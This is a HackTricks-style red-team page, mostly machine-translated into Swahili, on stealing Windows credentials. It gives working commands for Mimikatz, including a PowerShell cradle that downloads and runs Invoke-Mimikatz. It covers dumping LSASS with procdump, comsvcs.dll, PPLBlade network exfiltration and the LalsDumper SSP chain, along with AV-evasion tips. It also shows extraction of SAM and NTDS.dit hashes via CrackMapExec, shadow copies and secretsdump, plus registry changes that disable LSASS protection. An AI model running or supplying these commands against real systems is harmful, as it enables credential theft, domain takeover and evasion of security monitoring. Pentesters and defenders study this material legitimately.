# Kuiba Maelezo ya Kuingia ya Windows

{{#include ../../banners/hacktricks-training.md}}

## Maelezo ya Kuingia Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Pata mambo mengine ambayo Mimikatz inaweza kufanya kwenye** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Jifunze kuhusu baadhi ya kinga zinazowezekana za credentials hapa.**](credentials-protections.md) **Kinga hizi zinaweza kuzuia Mimikatz kutoa baadhi ya credentials.**

## Credentials na Meterpreter

Tumia [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ambayo** niliyounda ili **kutafuta passwords na hashes** ndani ya mhanga.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Kupitisha AV

### Procdump + Mimikatz

Kwa kuwa **Procdump kutoka kwa** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ni zana halali ya Microsoft**, haigunduliki na Defender.\
Unaweza kutumia zana hii ili **dump the lsass process**, **download the dump** na **extract** **credentials locally** kutoka kwenye dump.

Unaweza pia kutumia [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Mchakato huu hufanywa moja kwa moja kwa kutumia [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Kumbuka**: Baadhi ya **AV** zinaweza **kubaini** matumizi ya **procdump.exe to dump lsass.exe** kama **malicious**, hii ni kwa sababu zina **kubaini** kamba **"procdump.exe" and "lsass.exe"**. Kwa hivyo ni **stealthier** kupitisha kama **argument** **PID** ya lsass.exe kwa procdump **instead of** jina **lsass.exe.**

### Dumping lsass with **comsvcs.dll**

DLL iitwayo **comsvcs.dll** inayokuwapo katika `C:\Windows\System32` inahusika na **dumping process memory** wakati wa crash. DLL hii ina **function** iitwayo **`MiniDumpW`**, iliyobuniwa iitwe kwa kutumia `rundll32.exe`.\
Haihitaji kutumia hoja za kwanza mbili, lakini ya tatu imegawanywa katika sehemu tatu. ID ya mchakato inayotakiwa kudump inaunda sehemu ya kwanza, eneo la faili ya dump ni sehemu ya pili, na sehemu ya tatu ni neno tu **full**. Hakuna chaguo mbadala.\
Baada ya kutafsiri sehemu hizo tatu, DLL hiyo huanza kuunda faili ya dump na kuhamisha kumbukumbu ya mchakato uliotajwa ndani ya faili hilo.\
Kutumia **comsvcs.dll** kunawezekana kwa kudump mchakato wa lsass, hivyo kuondoa haja ya kupakia na kuendesha procdump. Njia hii imeelezewa kwa undani kwenye [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Amri ifuatayo inatumika kutekeleza:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Unaweza kuendesha mchakato huu kwa otomatiki kwa kutumia** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Kutoa lsass kwa Task Manager**

1. Bonyeza kwa kulia kwenye Task Bar na ubofye Task Manager
2. Bofya More details
3. Tafuta mchakato "Local Security Authority Process" kwenye tab ya Processes
4. Bonyeza kwa kulia kwenye mchakato "Local Security Authority Process" na ubofye "Create dump file".

### Kutoa lsass kwa procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ni binary iliyotiwa saini na Microsoft ambayo ni sehemu ya suite ya [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass na PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ni Protected Process Dumper Tool inayounga mkono kuficha memory dump na kuzihamisha kwenye workstations za mbali bila kuziweka kwenye diski.

**Vipengele muhimu**:

1. Kuvuka ulinzi wa PPL
2. Kuficha memory dump files ili kuepuka Defender signature-based detection mechanisms
3. Kupakia memory dump kwa njia za upload za RAW na SMB bila kuiweka kwenye diski (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon ships a three-stage dumper dubbed **LalsDumper** that never calls `MiniDumpWriteDump`, so EDR hooks on that API never fire:

1. **Stage 1 loader (`lals.exe`)** – inatafuta `fdp.dll` kwa placeholder yenye herufi `d` ndogo 32, inaibadilisha na njia kamili kwenda `rtu.txt`, inahifadhi DLL iliyorekebishwa kama `nfdp.dll`, na inaita `AddSecurityPackageA("nfdp","fdp")`. Hii inalazimisha **LSASS** ipakie DLL haramu kama Security Support Provider (SSP) mpya.
2. **Stage 2 inside LSASS** – wakati LSASS inapopakua `nfdp.dll`, DLL husoma `rtu.txt`, inafanya XOR kila byte na `0x20`, na inaweka blob iliyotangazwa (decoded) ndani ya memory kabla ya kuhamisha utekelezaji.
3. **Stage 3 dumper** – payload iliyochomekwa inatekeleza tena MiniDump logic kwa kutumia **direct syscalls** zilizoambatanishwa kutoka kwa majina ya API yaliyohashiwa (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Export maalum iitwayo `Tom` inafungua `%TEMP%\<pid>.ddt`, inaandika dump ya LSASS iliyokandwa kwenye faili, na inafunga handle ili exfiltration iweze kutokea baadaye.

Operator notes:

* Weka `lals.exe`, `fdp.dll`, `nfdp.dll`, na `rtu.txt` kwenye directory ile ile. Stage 1 inaandika tena placeholder iliyowekwa ngumu na njia kamili ya `rtu.txt`, hivyo kuvitenganisha kunavunja mnyororo.
* Usajili hufanyika kwa kuambatisha `nfdp` kwenye `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Unaweza kuweka thamani hiyo mwenyewe ili LSASS ireload SSP kila boot.
* `%TEMP%\*.ddt` ni dumps zilizokandwa. Fungua (decompress) kiasili, kisha ziingize Mimikatz/Volatility kwa uchukuaji wa credential.
* Kuendesha `lals.exe` kunahitaji haki za admin/SeTcb ili `AddSecurityPackageA` ifanikiwe; mara wito unaporejesha, LSASS inapakia kwa uwazi SSP haramu na inatekeleza Stage 2.
* Kuondoa DLL kutoka diski hakuondoi kutoka LSASS. Futa entry ya registry na anzisha tena LSASS (reboot) au uiachie kwa persistence ya muda mrefu.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump ya NTDS.dit kutoka kwa DC lengwa
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump the NTDS.dit password history kutoka kwa DC lengwa
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Onyesha sifa ya pwdLastSet kwa kila akaunti ya NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Faili hizi zinapaswa kuwa **zilipo** katika _C:\windows\system32\config\SAM_ na _C:\windows\system32\config\SYSTEM_. Lakini **huwezi kuzinakili tu kwa njia ya kawaida** kwa sababu zinalindwa.

### Kutoka kwa Registry

Njia rahisi zaidi ya steal faili hizi ni kupata nakala kutoka kwa Registry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Download** faili hizo kwenye mashine yako ya Kali na **extract the hashes** kwa kutumia:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Unaweza kunakili faili zilizolindwa ukitumia huduma hii. Unahitaji kuwa Administrator.

#### Using vssadmin

vssadmin binary inapatikana tu katika matoleo ya Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Lakini unaweza kufanya vivyo hivyo kutoka **Powershell**. Hii ni mfano wa **jinsi ya kunakili SAM file** (diski ngumu inayotumika ni "C:" na imehifadhiwa katika C:\users\Public) lakini unaweza kutumia hii kunakili faili yoyote iliyolindwa:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Msimbo kutoka kwenye kitabu: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Mwisho kabisa, unaweza pia kutumia the [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) ili kutengeneza nakala ya SAM, SYSTEM na ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

The **NTDS.dit** file is known as the heart of **Active Directory**, holding crucial data about user objects, groups, and their memberships. It's where the **password hashes** for domain users are stored. This file is an **Extensible Storage Engine (ESE)** database and resides at **_%SystemRoom%/NTDS/ntds.dit_**.

Within this database, three primary tables are maintained:

- **Data Table**: This table is tasked with storing details about objects like users and groups.
- **Link Table**: It keeps track of relationships, such as group memberships.
- **SD Table**: **Security descriptors** for each object are held here, ensuring the security and access control for the stored objects.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (you can find the latest accessed data probably because of the performance improve by using a **cache**).

#### Decrypting the hashes inside NTDS.dit

The hash is cyphered 3 times:

1. Decrypt Password Encryption Key (**PEK**) using the **BOOTKEY** and **RC4**.
2. Decrypt the **hash** using **PEK** and **RC4**.
3. Decrypt the **hash** using **DES**.

**PEK** have the **same value** in **every domain controller**, but it is **cyphered** inside the **NTDS.dit** file using the **BOOTKEY** of the **SYSTEM file of the domain controller (is different between domain controllers)**. This is why to get the credentials from the NTDS.dit file **you need the files NTDS.dit and SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Available since Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Unaweza pia kutumia mbinu ya [**volume shadow copy**](#stealing-sam-and-system) kunakili faili ya **ntds.dit**. Kumbuka kwamba pia utahitaji nakala ya **SYSTEM file** (tena, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) mbinu).

### **Kutoa hashes kutoka NTDS.dit**

Mara baada ya kuwa **umepata** faili **NTDS.dit** na **SYSTEM** unaweza kutumia zana kama _secretsdump.py_ ili **kutoa hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Unaweza pia **kuvitoa kiotomatiki** ukitumia mtumiaji halali wa domain admin:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Kwa **faili kubwa za NTDS.dit** inashauriwa kuzitoa kwa kutumia [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Mwishowe, unaweza pia kutumia **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ au **mimikatz** `lsadump::lsa /inject`

### **Kutoa vitu vya domain kutoka NTDS.dit hadi hifadhidata ya SQLite**

Vitu vya NTDS vinaweza kuchukuliwa hadi hifadhidata ya SQLite kwa kutumia [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Sio tu siri zinazoondolewa bali pia vitu vyote kwa undani na sifa (attributes) zao kwa ajili ya uchimbaji wa taarifa zaidi wakati faili ghafi ya NTDS.dit tayari imepatikana.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive ni hiari lakini inaruhusu ufichuzi wa siri (NT & LM hashes, supplemental credentials kama cleartext passwords, kerberos au trust keys, NT & LM password histories). Pamoja na taarifa nyingine, data zifuatazo zinachukuliwa: akaunti za watumiaji na mashine na hashes zao, UAC flags, timestamp ya last logon na password change, maelezo ya akaunti, majina, UPN, SPN, vikundi na recursive memberships, mti wa organizational units na uanachama, trusted domains zenye trusts type, direction na attributes...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). Unaweza kutumia binary hii ku-extract credentials kutoka kwa programu mbalimbali.
```
lazagne.exe all
```
## Zana nyingine za kutoa credentials kutoka SAM na LSASS

### Windows credentials Editor (WCE)

Zana hii inaweza kutumika kutoa credentials kutoka kwenye kumbukumbu. Pakua kutoka: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Hutoa credentials kutoka faili la SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Toa credentials kutoka kwenye faili la SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) na **endesha** tu na maneno ya siri zitatolewa.

## Kuchimba vikao vya RDP visivyotumika na kudhoofisha udhibiti wa usalama

Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – chambua kila user hive at `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Each subkey stores the server name, `UsernameHint`, and the last write timestamp. You can replicate FinalDraft’s logic with PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – query the `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log for Event IDs **21** (successful logon) and **25** (disconnect) to map who administered the box:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Mara ukijua ni Domain Admin gani huunganishwa mara kwa mara, dump LSASS (kwa LalsDumper/Mimikatz) wakati kikao chao kilicho **imekatika** bado kipo. CredSSP + NTLM fallback huacha verifier na tokens zao ndani ya LSASS, ambayo yanaweza kisha kurudishwa kupitia SMB/WinRM ili kupata `NTDS.dit` au kuanzisha persistence kwenye domain controllers.

### Kupungua kwa usalama kwenye Registry kulengwa na FinalDraft
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Kuweka `DisableRestrictedAdmin=1` hufanya credential/ticket reuse kamili wakati wa RDP, ikiruhusu pass-the-hash style pivots.
* `LocalAccountTokenFilterPolicy=1` huondoa UAC token filtering hivyo local admins wanapata unrestricted tokens kupitia mtandao.
* `DSRMAdminLogonBehavior=2` huruhusu msimamizi wa DSRM kuingia wakati DC iko mtandaoni, ikimpa washambuliaji akaunti nyingine iliyojengwa yenye ruhusa za juu.
* `RunAsPPL=0` huondoa LSASS PPL protections, na kufanya ufikaji wa memory kuwa rahisi kwa dumpers kama LalsDumper.

## Marejeo

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
